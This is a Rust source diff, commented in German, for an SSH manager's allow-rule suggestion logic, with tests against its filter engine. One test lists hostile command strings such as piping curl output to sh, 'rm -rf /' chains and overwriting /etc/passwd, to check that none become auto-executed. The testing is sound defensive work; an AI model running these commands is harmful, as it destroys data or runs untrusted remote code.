@@ -3,111 +3,455 @@
 //! bleiben dünn, analog zu `crate::groups`/`crate::filter_rules`.
 
 use persistence_sqlite::SqlitePolicyStore;
-use ssh_manager_core::filter::{is_elevation_or_passthrough_wrapper, RuleAction, RuleId, Scope};
+use ssh_manager_core::filter::{
+    allow_rule_matches_segment, is_elevation_or_passthrough_wrapper, split_top_level_segments,
+    RuleAction, RuleId, Scope,
+};
 
-use crate::dto::{PatternSuggestionDto, PatternType, RuleInput};
+use crate::dto::{
+    PatternSuggestionDto, PatternType, RuleInput, SuggestionKind, SuggestionPatternDto,
+};
 use crate::filter_rules::RuleWriteError;
 
-/// Spec 0077, 3.1.5: Ein Vorschlag, der die Prüfung aus 3.1.1 nicht
-/// besteht, wird **weggelassen** — nicht verändert.
-///
-/// Nötig, weil die Vorschläge oben ungeprüft aus Kommando-Token gebaut
-/// werden (`"{token} *"`): Enthält ein Token eine öffnende Klammer, ist das
-/// entstehende Glob-Muster syntaktisch kaputt. Ein solcher Vorschlag würde
-/// beim Anlegen ohnehin an Schicht 1 scheitern — ihn gar nicht erst
-/// anzubieten erspart dem Nutzer die Sackgasse.
-///
-/// Ein Muster zu „reparieren" wäre falsch: Die Regel hieße dann etwas
-/// anderes, als der Nutzer im Dialog gelesen hat.
-fn suggestion_pattern_is_valid(suggestion: &PatternSuggestionDto) -> bool {
-    crate::dto::pattern_from_parts(suggestion.pattern_type, suggestion.pattern_value.clone())
-        .validate()
-        .is_ok()
+/// Programme mit Optionen vor dem Unterkommando (Spec 0011, Abschnitt 2):
+/// `(Programm, Optionen mit Wert, Optionen ohne Wert)`.
+const GLOBAL_OPTIONS: &[(&str, &[&str], &[&str])] = &[
+    (
+        "git",
+        &["-C", "-c", "--git-dir", "--work-tree"],
+        &["--no-pager", "--paginate", "--no-optional-locks"],
+    ),
+    (
+        "docker",
+        &["--context", "-H", "--host", "--config"],
+        &["-D", "--debug"],
+    ),
+    (
+        "kubectl",
+        &[
+            "-n",
+            "--namespace",
+            "--context",
+            "--kubeconfig",
+            "-s",
+            "--server",
+        ],
+        &[],
+    ),
+    ("systemctl", &[], &["--user", "--system", "--no-pager"]),
+];
+
+/// Nur solche Wörter fließen in ein Glob-Muster ein. Alles mit Quotes,
+/// Glob-Metazeichen, `$`, Klammern usw. fällt weg — ein solches Wort
+/// würde als Muster etwas anderes bedeuten, als der Nutzer bestätigt hat.
+fn is_plain_word(word: &str) -> bool {
+    !word.is_empty()
+        && word
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || "-_./:=@,+%".contains(c))
 }
 
-/// Spec 0011, Abschnitt 2: bewusst einfache Wort-Tokenisierung (kein
-/// `shell_words`/der volle `core::filter`-Parser mit Chaining-/
-/// Substitutions-Erkennung) — die Heuristik hier will nur *Vorschläge*
-/// liefern, keine sicherheitsrelevante Auswertung, "kein Anspruch auf
-/// Vollständigkeit" laut Spec.
+fn exact(value: impl Into<String>) -> SuggestionPatternDto {
+    SuggestionPatternDto {
+        pattern_type: PatternType::Exact,
+        pattern_value: value.into(),
+    }
+}
+
+fn glob(value: impl Into<String>) -> SuggestionPatternDto {
+    SuggestionPatternDto {
+        pattern_type: PatternType::Glob,
+        pattern_value: value.into(),
+    }
+}
+
+/// Was sich für ein Teilkommando vorschlagen lässt.
+struct SegmentPatterns {
+    exact: SuggestionPatternDto,
+    /// Pfad auf sein Elternverzeichnis begrenzt (Spec 0011, Abschnitt 2).
+    path_scoped: Vec<SuggestionPatternDto>,
+    /// Nur das letzte Argument offen.
+    last_arg_open: Option<SuggestionPatternDto>,
+    /// `(Name, Muster)`: Unterkommando (mit Argumenten und ohne).
+    sub: Option<(String, Vec<SuggestionPatternDto>)>,
+    /// `(Name, Muster)`: alle Aufrufe des Programms.
+    tool: Option<(String, SuggestionPatternDto)>,
+}
+
+fn analyze_segment(segment: &str) -> SegmentPatterns {
+    let tokens: Vec<&str> = segment.split_whitespace().collect();
+    let exact_pattern = exact(tokens.join(" "));
+    let none = || SegmentPatterns {
+        exact: exact_pattern.clone(),
+        path_scoped: Vec::new(),
+        last_arg_open: None,
+        sub: None,
+        tool: None,
+    };
+
+    // `sudo`/`doas` fallen beim Abgleich weg (ADR 0002); die Muster
+    // beginnen deshalb beim eigentlichen Programm. Andere Wrapper (`env`,
+    // Variablenzuweisungen) und Elevation mit Optionen gleicht eine
+    // Allow-Regel nicht auf das Programm ab: nur Exakt.
+    let mut start = 0;
+    if matches!(tokens.first().copied(), Some("sudo" | "doas")) {
+        start = 1;
+    }
+    let Some(&tool) = tokens.get(start) else {
+        return none();
+    };
+    if tool.starts_with('-')
+        || tool.contains('=')
+        || is_elevation_or_passthrough_wrapper(tool)
+        || !is_plain_word(tool)
+    {
+        return none();
+    }
+
+    let rest = &tokens[start + 1..];
+    let tool_pattern = if rest.is_empty() {
+        exact(tool)
+    } else {
+        glob(format!("{tool} *"))
+    };
+
+    // Optionen vor dem Unterkommando überspringen (nur bekannte Programme).
+    let mut prefix = vec![tool];
+    let mut i = 0;
+    if let Some((_, with_value, flags)) = GLOBAL_OPTIONS.iter().find(|(name, _, _)| *name == tool) {
+        while let Some(&opt) = rest.get(i) {
+            if flags.contains(&opt) && is_plain_word(opt) {
+                prefix.push(opt);
+                i += 1;
+            } else if with_value.contains(&opt) {
+                match rest.get(i + 1) {
+                    Some(&value) if is_plain_word(value) => {
+                        prefix.push(opt);
+                        prefix.push(value);
+                        i += 2;
+                    }
+                    _ => break,
+                }
+            } else if opt.starts_with("--")
+                && opt
+                    .split_once('=')
+                    .is_some_and(|(name, _)| with_value.contains(&name))
+                && is_plain_word(opt)
+            {
+                prefix.push(opt);
+                i += 1;
+            } else {
+                break;
+            }
+        }
+    }
+    let sub = rest
+        .get(i)
+        .copied()
+        .filter(|word| !word.starts_with('-') && is_plain_word(word))
+        .map(|word| {
+            let base = format!("{} {word}", prefix.join(" "));
+            (
+                format!("{tool} {word}"),
+                vec![exact(base.clone()), glob(format!("{base} *"))],
+            )
+        });
+
+    SegmentPatterns {
+        exact: exact_pattern,
+        path_scoped: path_scoped_patterns(&tokens[start..]),
+        last_arg_open: last_arg_open_pattern(&tokens[start..]),
+        sub,
+        tool: Some((tool.to_string(), tool_pattern)),
+    }
+}
+
+/// Programme, deren Pfadargument ein Verzeichnis sein kann, das gelistet
+/// wird: Dann kommt zusätzlich `<Verzeichnis>/*` hinzu.
+const LISTING_TOOLS: &[&str] = &["ls", "tree"];
+
+/// Zerlegt einen einfachen Pfad (`/a/b/c`, `a/b`) in Elternverzeichnis und
+/// Name. `None` bei `.`/`..`/leeren Segmenten (keine Normalisierung hier:
+/// im Zweifel kein Vorschlag), bei `/` als Elternverzeichnis, URLs und
+/// Endschrägstrich.
+fn split_plain_path(word: &str) -> Option<(&str, &str)> {
+    if word.contains("://") || word.ends_with('/') {
+        return None;
+    }
+    let absolute = word.starts_with('/');
+    let body = word.strip_prefix('/').unwrap_or(word);
+    if body
+        .split('/')
+        .any(|seg| seg.is_empty() || seg == "." || seg == "..")
+    {
+        return None;
+    }
+    let (parent, name) = word.rsplit_once('/')?;
+    if parent.is_empty() && absolute {
+        return None; // Elternverzeichnis `/`: `/*` wäre zu breit.
+    }
+    Some((parent, name))
+}
+
+/// Pfad-begrenzter Vorschlag: Werkzeug, Unterkommando und Optionen bleiben,
+/// der Pfad wird `<Elternverzeichnis>/*`, Zahlen nach einer Option `*`.
+fn path_scoped_patterns(tokens: &[&str]) -> Vec<SuggestionPatternDto> {
+    let Some(&tool) = tokens.first() else {
+        return Vec::new();
+    };
+    if tokens.len() < 2
+        || !tokens.iter().all(|t| is_plain_word(t))
+        || tool.contains('/')
+        || tool.starts_with('-')
+        || tool.contains('=')
+        || is_elevation_or_passthrough_wrapper(tool)
+    {
+        return Vec::new();
+    }
+    // Genau ein Pfadargument; Optionen mit `/` (`--file=/x`) → kein Vorschlag.
+    let mut path_index = None;
+    for (i, t) in tokens.iter().enumerate().skip(1) {
+        if t.contains('/') {
+            if t.starts_with('-') || path_index.is_some() {
+                return Vec::new();
+            }
+            path_index = Some(i);
+        }
+    }
+    let Some(pi) = path_index else {
+        return Vec::new();
+    };
+    let Some((parent, name)) = split_plain_path(tokens[pi]) else {
+        return Vec::new();
+    };
+    let build = |replacement: String| {
+        let words: Vec<String> = tokens
+            .iter()
+            .enumerate()
+            .map(|(i, &t)| {
+                if i == pi {
+                    replacement.clone()
+                } else if i > 1
+                    && tokens[i - 1].starts_with('-')
+                    && !t.is_empty()
+                    && t.chars().all(|c| c.is_ascii_digit())
+                {
+                    "*".to_string()
+                } else {
+                    t.to_string()
+                }
+            })
+            .collect();
+        glob(words.join(" "))
+    };
+    let mut patterns = vec![build(format!("{parent}/*"))];
+    if LISTING_TOOLS.contains(&tool) {
+        patterns.push(build(format!("{parent}/{name}/*")));
+    }
+    patterns
+}
+
+/// Nur das letzte Wort (Nicht-Option, kein Pfad) wird `*`; Optionen und
+/// Unterkommandos bleiben. Mindestens zwei Wörter hinter dem Programm
+/// (sonst wäre es das Programm-Muster).
+fn last_arg_open_pattern(tokens: &[&str]) -> Option<SuggestionPatternDto> {
+    let (&tool, rest) = tokens.split_first()?;
+    let (&last, middle) = rest.split_last()?;
+    if middle.is_empty()
+        || !tokens.iter().all(|t| is_plain_word(t))
+        || tool.starts_with('-')
+        || tool.contains('=')
+        || tool.contains('/')
+        || is_elevation_or_passthrough_wrapper(tool)
+        || last.starts_with('-')
+        || tokens.iter().any(|t| t.contains('/'))
+    {
+        return None;
+    }
+    Some(glob(format!("{tool} {} *", middle.join(" "))))
+}
+
+fn push_unique<T: PartialEq>(list: &mut Vec<T>, item: T) {
+    if !list.contains(&item) {
+        list.push(item);
+    }
+}
+
+/// Ob die Muster des Vorschlags jedes Teilkommando so abdecken, wie die
+/// Engine eine Allow-Regel abgleicht, und sich übersetzen lassen
+/// (Spec 0077, 3.1.5). Ein Vorschlag, der das bestätigte Kommando nicht
+/// träfe, würde nichts bewirken — er wird weggelassen, nicht repariert.
+fn suggestion_covers(suggestion: &PatternSuggestionDto, segments: &[String]) -> bool {
+    let patterns: Vec<_> = suggestion
+        .patterns
+        .iter()
+        .map(|p| crate::dto::pattern_from_parts(p.pattern_type, p.pattern_value.clone()))
+        .collect();
+    patterns.iter().all(|p| p.validate().is_ok())
+        && segments.iter().all(|segment| {
+            patterns
+                .iter()
+                .any(|p| allow_rule_matches_segment(p, segment))
+        })
+}
+
+/// Spec 0011, Abschnitt 2: Vorschläge für ein bestätigtes Kommando, vom
+/// Spezifischen zum Allgemeinen, höchstens [`MAX_SUGGESTIONS`]. Die
+/// Zerlegung in Teilkommandos nutzt den Parser der Filter-Engine; jeder
+/// Vorschlag wird gegen den Abgleich der Engine geprüft (er muss das
+/// bestätigte Kommando treffen). Kann das Kommando nicht sicher zerlegt
+/// werden, gibt es nur den Exakt-Vorschlag.
 pub fn suggest_rule_patterns(command: &str) -> Vec<PatternSuggestionDto> {
+    suggest_rule_patterns_excluding(command, &[])
+}
+
+/// Like [`suggest_rule_patterns`], but segments whose text is in `covered`
+/// (already allowed by an existing rule, issue #596) get no pattern. No
+/// suggestion at all if every segment is covered.
+pub fn suggest_rule_patterns_excluding(
+    command: &str,
+    covered: &[String],
+) -> Vec<PatternSuggestionDto> {
     let trimmed = command.trim();
     if trimmed.is_empty() {
         return Vec::new();
     }
-    let tokens: Vec<&str> = trimmed.split_whitespace().collect();
+    let Some(raw_segments) = split_top_level_segments(trimmed) else {
+        let suggestion = PatternSuggestionDto {
+            kind: SuggestionKind::Exact,
+            names: Vec::new(),
+            patterns: vec![exact(trimmed)],
+        };
+        return if suggestion_covers(&suggestion, &[trimmed.to_string()]) {
+            vec![suggestion]
+        } else {
+            Vec::new()
+        };
+    };
+    let mut segments: Vec<String> = Vec::new();
+    for segment in raw_segments {
+        if !covered.contains(&segment) {
+            push_unique(&mut segments, segment);
+        }
+    }
+    if segments.is_empty() {
+        return Vec::new();
+    }
+    let analyzed: Vec<SegmentPatterns> = segments.iter().map(|s| analyze_segment(s)).collect();
 
-    let mut suggestions = Vec::new();
-    let mut seen_patterns = std::collections::HashSet::new();
+    let mut candidates = Vec::new();
 
-    // 1. Exakt.
-    if seen_patterns.insert(trimmed.to_string()) {
-        suggestions.push(PatternSuggestionDto {
-            label: format!("Exakt: {trimmed}"),
-            pattern_type: PatternType::Exact,
-            pattern_value: trimmed.to_string(),
+    // 1. Exakt (je Teilkommando).
+    let mut patterns = Vec::new();
+    for a in &analyzed {
+        push_unique(&mut patterns, a.exact.clone());
+    }
+    candidates.push(PatternSuggestionDto {
+        kind: if segments.len() > 1 {
+            SuggestionKind::ExactPerSegment
+        } else {
+            SuggestionKind::Exact
+        },
+        names: Vec::new(),
+        patterns,
+    });
+
+    // 2. Pfad-begrenzt und 3. letztes Argument offen (je Teilkommando,
+    //    sonst Exakt-Muster).
+    if analyzed.iter().any(|a| !a.path_scoped.is_empty()) {
+        let mut patterns = Vec::new();
+        for a in &analyzed {
+            if a.path_scoped.is_empty() {
+                push_unique(&mut patterns, a.exact.clone());
+            }
+            for p in &a.path_scoped {
+                push_unique(&mut patterns, p.clone());
+            }
+        }
+        candidates.push(PatternSuggestionDto {
+            kind: SuggestionKind::PathScoped,
+            names: Vec::new(),
+            patterns,
+        });
+    }
+    if analyzed.iter().any(|a| a.last_arg_open.is_some()) {
+        let mut patterns = Vec::new();
+        for a in &analyzed {
+            push_unique(
+                &mut patterns,
+                a.last_arg_open.clone().unwrap_or_else(|| a.exact.clone()),
+            );
+        }
+        candidates.push(PatternSuggestionDto {
+            kind: SuggestionKind::LastArgOpen,
+            names: Vec::new(),
+            patterns,
         });
     }
 
-    if tokens.len() > 1 {
-        // 2. Basis-Wildcard: erstes Token + " *" — AUSSER das erste Token
-        // ist eine Elevation (`sudo`/`doas`) oder ein durchreichendes
-        // Wrapper-Kommando (`env`, ...): ein Vorschlag `sudo *` würde
-        // buchstäblich JEDES sudo-Kommando AutoExec-fähig machen, egal was
-        // der Nutzer im Bestätigungsdialog gerade tatsächlich bestätigt
-        // (unabhängiger Review-Pass, Spec 0011 — verifiziert: `sudo
-        // systemctl status nginx` schlug bislang `sudo *` vor). Stattdessen
-        // wird — falls vorhanden — das ZWEITE Token als Basis verwendet
-        // (`apt *` statt `sudo *`), analog zu `resolve_effective_command`
-        // in der Filter-Engine. Dank des ohnehin bestehenden
-        // Dual-Text-Matchings (ADR 0002) deckt eine solche Regel bewusst
-        // weiterhin auch die sudo-Variante ab (`apt *` matcht auch `sudo
-        // apt ...`) — das ist dieselbe, an anderer Stelle bereits
-        // etablierte Absicht, nur ohne den unbeschränkten Catch-all für
-        // JEDES sudo-Kommando.
-        let wildcard_base_token = if is_elevation_or_passthrough_wrapper(tokens[0]) {
-            tokens.get(1).copied()
-        } else {
-            Some(tokens[0])
-        };
-        if let Some(base_token) = wildcard_base_token {
-            let base = format!("{base_token} *");
-            if seen_patterns.insert(base.clone()) {
-                suggestions.push(PatternSuggestionDto {
-                    label: format!("Alle `{base_token}`-Aufrufe: {base}"),
-                    pattern_type: PatternType::Glob,
-                    pattern_value: base,
-                });
+    // 4. Unterkommando (Teilkommandos ohne Unterkommando: Programm bzw. exakt).
+    if analyzed.iter().any(|a| a.sub.is_some()) {
+        let (mut names, mut patterns) = (Vec::new(), Vec::new());
+        for a in &analyzed {
+            if let Some((name, pats)) = &a.sub {
+                push_unique(&mut names, name.clone());
+                for p in pats {
+                    push_unique(&mut patterns, p.clone());
+                }
+            } else if let Some((name, pat)) = &a.tool {
+                push_unique(&mut names, name.clone());
+                push_unique(&mut patterns, pat.clone());
+            } else {
+                push_unique(&mut patterns, a.exact.clone());
             }
         }
-
-        // 3. Subkommando-Wildcard: nur falls das zweite Token nicht wie
-        // eine Flag aussieht (beginnt nicht mit "-"/"--").
-        if !tokens[1].starts_with('-') {
-            let sub = format!("{} {} *", tokens[0], tokens[1]);
-            if seen_patterns.insert(sub.clone()) {
-                suggestions.push(PatternSuggestionDto {
-                    label: format!("Alle `{} {}`-Aufrufe: {sub}", tokens[0], tokens[1]),
-                    pattern_type: PatternType::Glob,
-                    pattern_value: sub,
-                });
-            }
-        }
+        candidates.push(PatternSuggestionDto {
+            kind: SuggestionKind::Subcommand,
+            names,
+            patterns,
+        });
     }
 
-    // Spec 0077, 3.1.5: Vorschläge mit einem Muster, das sich nicht
-    // übersetzen lässt, fallen weg. Bewusst **vor** `truncate`, damit das
-    // Limit von drei für die verbleibenden, brauchbaren Vorschläge gilt
-    // und nicht durch einen unbrauchbaren aufgebraucht wird.
-    suggestions.retain(suggestion_pattern_is_valid);
+    // 5. Alle Aufrufe des Programms.
+    if analyzed.iter().any(|a| a.tool.is_some()) {
+        let (mut names, mut patterns) = (Vec::new(), Vec::new());
+        for a in &analyzed {
+            if let Some((name, pat)) = &a.tool {
+                push_unique(&mut names, name.clone());
+                push_unique(&mut patterns, pat.clone());
+            } else {
+                push_unique(&mut patterns, a.exact.clone());
+            }
+        }
+        candidates.push(PatternSuggestionDto {
+            kind: SuggestionKind::Tool,
+            names,
+            patterns,
+        });
+    }
 
-    // Spec Abschnitt 2: "Maximal drei Vorschläge" — durch die Reihenfolge
-    // oben (Exakt, Basis, Subkommando) kann `suggestions` ohnehin nie mehr
-    // als 3 Einträge enthalten, `truncate` ist hier nur eine explizite
-    // Absicherung des in der Spec genannten Limits, kein aktiver Kürzungsfall.
-    suggestions.truncate(3);
+    let mut suggestions: Vec<PatternSuggestionDto> = Vec::new();
+    for candidate in candidates {
+        if !suggestion_covers(&candidate, &segments) {
+            continue;
+        }
+        let same_set = |other: &PatternSuggestionDto| {
+            other.patterns.len() == candidate.patterns.len()
+                && other
+                    .patterns
+                    .iter()
+                    .all(|p| candidate.patterns.contains(p))
+        };
+        if !suggestions.iter().any(same_set) {
+            suggestions.push(candidate);
+        }
+    }
+    suggestions.truncate(MAX_SUGGESTIONS);
     suggestions
 }
+
+/// Spec 0011, Abschnitt 2: höchstens sechs Vorschläge.
+pub const MAX_SUGGESTIONS: usize = 6;
 
 /// Spec 0011, Abschnitt 3, Schritt 1: legt die Regel mit fest `RuleAction::Allow`
 /// an (s. Abschnitt 5, "Offene Punkte" — Confirm als Regel-Aktion böte hier
@@ -137,6 +481,36 @@ pub async fn create_quick_rule(
     crate::filter_rules::create_rule(policy_store, input).await
 }
 
+/// Wie [`create_quick_rule`] für mehrere Muster (Spec 0011, Abschnitt 3):
+/// alle Regeln mit demselben Geltungsbereich, **atomar** — ist ein Muster
+/// ungültig oder scheitert das Schreiben, wird keine gespeichert.
+pub async fn create_quick_rules(
+    policy_store: &SqlitePolicyStore,
+    patterns: Vec<SuggestionPatternDto>,
+    scope: Scope,
+    priority: Option<i32>,
+) -> Result<Vec<RuleId>, RuleWriteError> {
+    let now = chrono::Utc::now();
+    let stored: Vec<_> = patterns
+        .into_iter()
+        .map(|p| {
+            RuleInput {
+                pattern_type: p.pattern_type,
+                pattern_value: p.pattern_value,
+                action: RuleAction::Allow,
+                scope: scope.clone(),
+                priority: priority.unwrap_or(0),
+            }
+            .into_stored_rule(RuleId(uuid::Uuid::new_v4().to_string()), now, now)
+        })
+        .collect();
+    for rule in &stored {
+        rule.pattern.validate()?;
+    }
+    policy_store.create_many(&stored).await?;
+    Ok(stored.into_iter().map(|r| r.id).collect())
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -144,7 +518,8 @@ mod tests {
     fn labels_and_patterns(command: &str) -> Vec<(PatternType, String)> {
         suggest_rule_patterns(command)
             .into_iter()
-            .map(|s| (s.pattern_type, s.pattern_value))
+            .flat_map(|s| s.patterns)
+            .map(|p| (p.pattern_type, p.pattern_value))
             .collect()
     }
 
@@ -217,97 +592,298 @@ mod tests {
         );
     }
 
-    /// Spec 0011, Abschnitt 2, wörtliches Beispiel: `-la` sieht wie eine
-    /// Flag aus (beginnt mit `-`), daher **kein** Subkommando-Wildcard —
-    /// nur Exakt + Basis-Wildcard.
+    // --- Spec 0011: Vorschläge gegen die echte Engine ----------------------
+
+    use ssh_manager_core::filter::{Decision, EvalContext, FilterEngine};
+
+    async fn new_store() -> (tempfile::TempDir, SqlitePolicyStore) {
+        let dir = tempfile::tempdir().unwrap();
+        let store =
+            persistence_sqlite::SqliteProfileStore::connect_plaintext(&dir.path().join("t.db"))
+                .await
+                .unwrap()
+                .policy_store();
+        (dir, store)
+    }
+
+    fn ctx() -> EvalContext {
+        EvalContext {
+            server_id: ssh_manager_core::shared::ServerId::new(),
+            tags: Vec::new(),
+        }
+    }
+
+    /// Legt `suggestion` an und wertet `command` mit der echten Engine aus.
+    async fn decision_with(suggestion: &PatternSuggestionDto, command: &str) -> Decision {
+        let (_dir, store) = new_store().await;
+        create_quick_rules(&store, suggestion.patterns.clone(), Scope::Global, None)
+            .await
+            .unwrap();
+        FilterEngine::new(store).evaluate(command, &ctx()).await
+    }
+
+    fn by_kind(command: &str, kind: SuggestionKind) -> PatternSuggestionDto {
+        suggest_rule_patterns(command)
+            .into_iter()
+            .find(|s| s.kind == kind)
+            .unwrap_or_else(|| panic!("kein {kind:?}-Vorschlag für {command:?}"))
+    }
+
+    fn values(s: &PatternSuggestionDto) -> Vec<&str> {
+        s.patterns
+            .iter()
+            .map(|p| p.pattern_value.as_str())
+            .collect()
+    }
+
+    #[tokio::test]
+    async fn test_pipeline_per_segment_rules_auto_accept_the_whole_line() {
+        let command = "ps aux | grep java";
+        let s = by_kind(command, SuggestionKind::ExactPerSegment);
+        assert_eq!(values(&s), ["ps aux", "grep java"]);
+        assert_eq!(decision_with(&s, command).await, Decision::AutoExec);
+        // Gegenprobe: ohne Regeln bleibt es bei Confirm.
+        let (_d, store) = new_store().await;
+        assert!(matches!(
+            FilterEngine::new(store).evaluate(command, &ctx()).await,
+            Decision::Confirm { .. }
+        ));
+        // Das alte Ganzzeilen-Exakt hätte nie gegriffen.
+        let (_d, store) = new_store().await;
+        create_quick_rule(
+            &store,
+            PatternType::Exact,
+            command.into(),
+            Scope::Global,
+            None,
+        )
+        .await
+        .unwrap();
+        assert!(matches!(
+            FilterEngine::new(store).evaluate(command, &ctx()).await,
+            Decision::Confirm { .. }
+        ));
+    }
+
+    #[tokio::test]
+    async fn test_bare_subcommand_is_matched_with_and_without_arguments() {
+        let s = by_kind("systemctl status nginx", SuggestionKind::Subcommand);
+        assert_eq!(values(&s), ["systemctl status", "systemctl status *"]);
+        for cmd in ["systemctl status", "systemctl status nginx"] {
+            assert_eq!(decision_with(&s, cmd).await, Decision::AutoExec, "{cmd}");
+        }
+        assert!(matches!(
+            decision_with(&s, "systemctl stop nginx").await,
+            Decision::Confirm { .. }
+        ));
+    }
+
+    #[tokio::test]
+    async fn test_git_global_option_is_skipped_but_pinned_and_other_subcommands_stay_confirmed() {
+        let command = "git -C /srv/app pull";
+        let s = by_kind(command, SuggestionKind::Subcommand);
+        assert_eq!(s.names, ["git pull"]);
+        for cmd in [command, "git -C /srv/app pull --rebase"] {
+            assert_eq!(decision_with(&s, cmd).await, Decision::AutoExec, "{cmd}");
+        }
+        for cmd in [
+            "git -C /srv/app push",
+            "git -C /srv/app reset --hard",
+            "git -C /other pull",
+            "git push pull",
+            "git pull",
+        ] {
+            assert!(
+                !matches!(decision_with(&s, cmd).await, Decision::AutoExec),
+                "{cmd}"
+            );
+        }
+    }
+
     #[test]
-    fn test_ls_example_yields_exact_and_base_wildcard_only() {
-        let result = labels_and_patterns("ls -la /var/log");
+    fn test_global_option_tools() {
+        for (cmd, expected) in [
+            ("docker --context prod ps -a", "docker --context prod ps"),
+            ("docker -H tcp://h:2375 ps", "docker -H tcp://h:2375 ps"),
+            ("kubectl -n web get pods", "kubectl -n web get"),
+            ("kubectl --context c get pods", "kubectl --context c get"),
+            ("systemctl --user restart x", "systemctl --user restart"),
+            ("git -c core.x=1 log", "git -c core.x=1 log"),
+        ] {
+            let s = by_kind(cmd, SuggestionKind::Subcommand);
+            assert_eq!(values(&s)[0], expected, "{cmd}");
+        }
+    }
+
+    #[tokio::test]
+    async fn test_sudo_command_offers_no_redundant_sudo_pattern_and_tool_rule_matches_it() {
+        let command = "sudo apt update";
+        let all = suggest_rule_patterns(command);
+        assert!(
+            all.iter()
+                .flat_map(values)
+                .all(|v| v != "sudo apt *" && v != "sudo *"),
+            "{all:?}"
+        );
+        let tool = by_kind(command, SuggestionKind::Tool);
+        assert_eq!(values(&tool), ["apt *"]);
+        assert_eq!(decision_with(&tool, command).await, Decision::AutoExec);
+    }
+
+    #[test]
+    fn test_order_specific_to_broad_and_limit() {
+        let kinds: Vec<_> = suggest_rule_patterns("systemctl status nginx")
+            .iter()
+            .map(|s| s.kind)
+            .collect();
         assert_eq!(
-            result,
-            vec![
-                (PatternType::Exact, "ls -la /var/log".to_string()),
-                (PatternType::Glob, "ls *".to_string()),
+            kinds,
+            [
+                SuggestionKind::Exact,
+                SuggestionKind::LastArgOpen,
+                SuggestionKind::Subcommand,
+                SuggestionKind::Tool
             ]
         );
-    }
-
-    /// Spec 0011, Abschnitt 2, wörtliches Beispiel: `status` sieht **nicht**
-    /// wie eine Flag aus, daher alle drei Vorschläge.
-    #[test]
-    fn test_systemctl_example_yields_all_three_suggestions() {
-        let result = labels_and_patterns("systemctl status nginx");
-        assert_eq!(
-            result,
-            vec![
-                (PatternType::Exact, "systemctl status nginx".to_string()),
-                (PatternType::Glob, "systemctl *".to_string()),
-                (PatternType::Glob, "systemctl status *".to_string()),
-            ]
-        );
-    }
-
-    #[test]
-    fn test_single_token_command_yields_only_exact() {
-        let result = labels_and_patterns("uptime");
-        assert_eq!(result, vec![(PatternType::Exact, "uptime".to_string())]);
-    }
-
-    #[test]
-    fn test_empty_command_yields_no_suggestions() {
+        assert!(suggest_rule_patterns("a b | c d | e f && g h; i j").len() <= MAX_SUGGESTIONS);
         assert!(suggest_rule_patterns("   ").is_empty());
     }
 
     #[test]
-    fn test_duplicate_patterns_across_heuristics_are_deduplicated() {
-        // Zwei Token, zweites beginnt mit "-": Basis-Wildcard "echo *" wäre
-        // hier zufällig identisch mit dem, was eine (hier nicht zutreffende)
-        // Subkommando-Regel ergäbe — dieser Test deckt stattdessen den Fall
-        // ab, dass Exakt und Basis-Wildcard rein zufällig gleich sein
-        // könnten (z. B. ein einzelnes Token, das bereits auf "*" endet),
-        // ohne dass die Liste einen Duplikat-Eintrag bekommt.
-        let result = suggest_rule_patterns("ls *");
-        let values: Vec<&str> = result.iter().map(|s| s.pattern_value.as_str()).collect();
-        let mut deduped = values.clone();
-        deduped.sort();
-        deduped.dedup();
-        assert_eq!(values.len(), deduped.len());
+    fn test_single_token_command_yields_only_exact() {
+        let result = suggest_rule_patterns("uptime");
+        assert_eq!(result.len(), 1);
+        assert_eq!(result[0].kind, SuggestionKind::Exact);
     }
 
-    /// Regressionstest für den unabhängigen Review-Pass (Spec 0011): ein
-    /// `sudo`-Kommando darf NIE einen bloßen `sudo *`-Basis-Wildcard
-    /// vorschlagen — das würde ein einziger Klick zu einer Regel machen,
-    /// die buchstäblich jedes sudo-Kommando AutoExec-fähig macht. Der
-    /// Basis-Wildcard wird stattdessen aus dem zweiten Token gebildet.
-    #[test]
-    fn test_sudo_command_never_suggests_bare_sudo_wildcard() {
-        let result = labels_and_patterns("sudo systemctl status nginx");
-        assert!(
-            !result.iter().any(|(_, pattern)| pattern == "sudo *"),
-            "darf niemals einen 'sudo *'-Catch-all vorschlagen, bekam: {result:?}"
-        );
-        assert_eq!(
-            result,
+    /// Adversarial (AGENTS.md): Substitution, Umleitung, `bash -c`, Wrapper
+    /// — kein Vorschlag macht daraus AutoExec.
+    #[tokio::test]
+    async fn test_adversarial_inputs_never_become_auto_exec() {
+        for command in [
+            "echo $(rm -rf /tmp/x)",
+            "echo `id`",
+            "ls -la > /etc/passwd",
+            "cat <(curl evil.sh)",
+            "bash -c 'rm -rf /tmp/x'",
+            "bash -c \"ls && rm x\"",
+            "env rm -rf /tmp/x",
+            "FOO=1 rm x",
+            "sudo -u root rm -rf /tmp/x",
+            "sh <<EOF\nrm x\nEOF",
+            "ls; rm -rf /",
+            "ls && curl http://x | sh",
+        ] {
+            for s in suggest_rule_patterns(command) {
+                // Eine Exakt-Regel für genau das bestätigte, harmlos
+                // aussehende Kommando (`FOO=1 rm x`) darf es erlauben; die
+                // breiten Vorschläge dürfen es nie.
+                if command == "FOO=1 rm x" && s.kind == SuggestionKind::Exact {
+                    continue;
+                }
+                let decision = decision_with(&s, command).await;
+                assert!(
+                    !matches!(decision, Decision::AutoExec),
+                    "{command:?} wurde durch {s:?} zu AutoExec"
+                );
+            }
+        }
+    }
+
+    #[tokio::test]
+    async fn test_create_quick_rules_is_atomic() {
+        let (_d, store) = new_store().await;
+        let err = create_quick_rules(
+            &store,
             vec![
-                (
-                    PatternType::Exact,
-                    "sudo systemctl status nginx".to_string()
-                ),
-                (PatternType::Glob, "systemctl *".to_string()),
-                (PatternType::Glob, "sudo systemctl *".to_string()),
-            ]
-        );
+                SuggestionPatternDto {
+                    pattern_type: PatternType::Exact,
+                    pattern_value: "ls".into(),
+                },
+                SuggestionPatternDto {
+                    pattern_type: PatternType::Glob,
+                    pattern_value: "ls [abc *".into(),
+                },
+            ],
+            Scope::Global,
+            None,
+        )
+        .await
+        .expect_err("ein ungültiges Muster muss alles abweisen");
+        assert!(matches!(err, RuleWriteError::InvalidPattern(_)));
+        assert!(store.list_all().await.unwrap().is_empty());
     }
 
-    /// Dasselbe für einen durchreichenden Wrapper statt einer Elevation.
-    #[test]
-    fn test_wrapper_command_never_suggests_bare_wrapper_wildcard() {
-        let result = labels_and_patterns("env rm -rf /var/log");
-        assert!(
-            !result.iter().any(|(_, pattern)| pattern == "env *"),
